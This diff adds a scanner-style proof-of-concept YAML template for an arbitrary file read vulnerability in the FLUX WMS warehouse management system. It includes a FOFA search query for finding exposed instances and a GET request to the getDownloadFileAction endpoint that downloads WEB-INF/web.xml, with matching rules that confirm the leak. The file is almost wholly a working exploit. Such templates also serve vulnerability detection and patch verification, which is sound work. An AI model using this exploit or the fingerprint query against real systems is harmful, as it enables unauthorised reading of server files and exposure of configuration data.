@@ -1,0 +1,16 @@
+id: poc-yaml-flux-wms-getdownloadfileaction-anyfile-read
+info:
+  name: 富勒仓储管理系统 getDownloadFileAction 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 富勒仓储管理系统
+  fofa: body="/logincenterapp/ValidateImageService" || title="FLUX WMS生产环境"
+requests:
+- method: GET
+  path: /a00webres/getDownloadFileAction?dowmLoadUrl=WEB-INF/web.xml&fileName=web.xml
+  expression: "status_code == 200 && \ncontains(body,\"web-app\") &&\ncontains(body,\"\
+    <display-name>\") &&\ncontains(headers,\"filename=\\\"web.xml\\\"\") &&\ncontains(content_type,\"\
+    application/force-download\")\n"
+variables: {}
+transport: http
